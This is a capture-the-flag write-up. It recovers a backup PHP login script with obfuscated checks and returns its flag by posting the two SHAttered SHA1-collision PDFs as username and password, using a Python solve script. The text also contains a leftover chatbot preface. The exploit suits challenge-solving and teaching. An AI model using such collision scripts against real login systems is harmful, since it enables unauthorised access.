
<img width="588" height="348" alt="screenshot-1752557543" src="https://github.com/user-attachments/assets/ca3bcb94-ecdf-422f-a130-cfac90ba1bbb" />


```
<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
</head>
<body style="text-align:center;">
    <pre>
 _               _         _  __                                       
| |             (_)       (_)/ _|                                      
| | ___   __ _   _ _ __    _| |_   _   _  ___  _   _    ___ __ _ _ __  
| |/ _ \ / _` | | | '_ \  | |  _| | | | |/ _ \| | | |  / __/ _` | '_ \ 
| | (_) | (_| | | | | | | | | |   | |_| | (_) | |_| | | (_| (_| | | | |
|_|\___/ \__, | |_|_| |_| |_|_|    \__, |\___/ \__,_|  \___\__,_|_| |_|
          __/ |                     __/ |                              
         |___/                     |___/                               


    </pre>
    <br/>
    <form action="impossibleLogin.php" method="post">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username"><br>
        <label for="pwd">Password:</label><br>
        <input type="password" id="pwd" name="pwd"><br><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>

```
After adding ~ to the url i saw some comments 
```
<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
</head>
<body style="text-align:center;">
    <pre>
 _               _         _  __                                       
| |             (_)       (_)/ _|                                      
| | ___   __ _   _ _ __    _| |_   _   _  ___  _   _    ___ __ _ _ __  
| |/ _ \ / _` | | | '_ \  | |  _| | | | |/ _ \| | | |  / __/ _` | '_ \ 
| | (_) | (_| | | | | | | | | |   | |_| | (_) | |_| | | (_| (_| | | | |
|_|\___/ \__, | |_|_| |_| |_|_|    \__, |\___/ \__,_|  \___\__,_|_| |_|
          __/ |                     __/ |                              
         |___/                     |___/                               


    </pre>
    <br/>
    <form action="impossibleLogin.php" method="post">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username"><br>
        <label for="pwd">Password:</label><br>
        <input type="password" id="pwd" name="pwd"><br><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>

<?php
 if(isset($_POST[base64_decode("\144\130\x4e\154\x63\155\x35\x68\142\127\125\x3d")])&& isset($_POST[base64_decode("\143\x48\x64\x6b")])){$yuf85e0677=$_POST[base64_decode("\144\x58\x4e\154\x63\x6d\65\150\x62\127\x55\75")];$rs35c246d5=$_POST[base64_decode("\143\x48\144\153")];if($yuf85e0677==$rs35c246d5){echo base64_decode("\x50\x47\112\x79\x4c\172\x35\x47\x59\127\154\163\132\127\x51\x68\111\x45\x35\166\x49\x47\132\163\131\127\x63\x67\x5a\155\71\171\111\x48\x6c\166\x64\x51\x3d\x3d");}else{if(sha1($yuf85e0677)===sha1($rs35c246d5)){echo file_get_contents(base64_decode("\x4c\151\64\166\x5a\x6d\x78\x68\x5a\x79\65\60\145\110\x51\75"));}else{echo base64_decode("\x50\107\112\171\x4c\x7a\65\107\x59\x57\154\x73\x5a\127\x51\x68\x49\105\x35\x76\111\x47\132\x73\131\127\x63\x67\x5a\155\71\x79\x49\110\154\x76\x64\x51\x3d\75");}}}?>
```
Sure! Here's a cleaner and more professional version of your explanation:

---

The PHP script first checks if the provided `username` and `password` are exactly equal. If they are, it returns a success message but **not** the flag. However, if the `username` and `password` are **not equal**, yet their **SHA1 hashes match**, the script reads and returns the contents of `../flag.txt`.

At first, it might seem like PHP type juggling (`==`) could be used to bypass the strict equality check. But since the script later uses `sha1(... ) === sha1(...)` (a strict comparison of strings), this approach doesn't work.

Instead, I used the well-known **SHAttered exploit** â€” a practical SHA1 collision discovered by Google and CWI in 2017. This exploit involves two different PDF files that produce the same SHA1 hash. By submitting the **raw bytes** of each PDF as the `username` and `password`, we can bypass the equality check (since the files differ) while still passing the SHA1 comparison (since their hashes match). As a result, the script returns the flag.

The following Python script automates this attack. It fetches the two PDFs from `shattered.io`, submits them to the vulnerable endpoint, and prints the response:

```python
import requests
import sys

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <url>")
    exit(1)

url = sys.argv[1]
pdf1 = "https://shattered.io/static/shattered-1.pdf"
pdf2 = "https://shattered.io/static/shattered-2.pdf"

print("[*] Getting pdf1 content")
pdf1_bytes = requests.get(pdf1).content

print("[*] Getting pdf2 content")
pdf2_bytes = requests.get(pdf2).content

data = {
    "username": pdf2_bytes,
    "pwd": pdf1_bytes
}

res = requests.post(url, data=data)
print(res.text)
```




 



